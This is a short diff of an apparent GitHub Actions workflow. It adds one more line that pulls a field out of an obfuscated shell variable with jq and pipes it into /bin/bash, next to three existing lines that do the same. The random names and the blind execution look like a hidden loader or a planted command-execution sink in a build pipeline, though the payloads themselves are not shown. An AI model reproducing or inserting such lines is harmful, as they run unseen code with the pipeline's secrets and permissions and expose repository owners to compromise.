@@ -28,6 +28,7 @@ jobs:
           echo $jghau9 | jq -r .owd83 | /bin/bash
           printf '%s' "$a84" | jq -r .eg17341 | /bin/bash
           printf '%s' "$me9747" | jq -r .icqzw24277 | /bin/bash
+          echo $rt5465 | jq -r .x5 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
